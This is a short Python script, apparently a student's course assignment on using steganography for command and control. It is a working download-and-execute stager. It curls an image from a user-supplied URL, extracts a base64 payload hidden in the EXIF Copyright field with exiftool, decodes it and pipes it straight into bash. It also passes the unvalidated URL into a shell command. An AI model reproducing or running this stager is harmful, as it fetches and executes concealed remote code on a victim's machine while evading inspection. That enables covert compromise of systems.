"""
Name    : Ardian Danny
NIM     : 2301847303
Kelas   : LA07
Topic   : Steganography Sebagai C&C
"""

import os
import sys
import json
import base64
import requests
import subprocess
from getopt import getopt


TARGET = ''


def help():
	print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Steganography C&C Help Menu -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
	print("-t --target 		[TARGET_FILE]            : The file you want to download and execute")
	print("\n\nExamples:")
	print("python3 steganographycnc_downloadexecute_2301847303.py -h")
	print("python3 steganographycnc_downloadexecute_2301847303.py -t https://i.ibb.co/LgYtwqN/b1af41a882f9.jpg")
	print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n")


def download_file():

	print("[*] Downloading image file..")

	try:
		os.system(f"curl {TARGET} -o downloaded_image_payload.jpg")
	except Exception as e:
		print(f"[!] Error: {e}")


	print("[+] Image payload downloaded!")


def execute_payload():

	try:
		process = subprocess.Popen(args="exiftool downloaded_image_payload.jpg -Copyright -j", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		output, error = process.communicate()

		payload = json.loads(output)
		payload = payload[0]["Copyright"][1:] # Ingat ini slicing untuk buang huruf 'b' di awalnya.
		payload = base64.b64decode(payload)

		os.system(f"echo {payload} | bash")

	except Exception as e:
		print(f"[!] Error: {e}")


def main():
    
	global TARGET
    
	options, _ = getopt(sys.argv[1:], "t:h", ["target=","help"])


	if len(options) == 0:

		help()

		print("[!] Please specify the filename you want to download and execute")

		sys.exit()


	for key, value in options:

    
		if (key in ["-h", "--help"]):
			help()
			sys.exit()
        
		elif key in ["-t", "--target"]:  
			TARGET = value
    
	download_file()

	execute_payload()


if __name__ == "__main__":
    
	main()
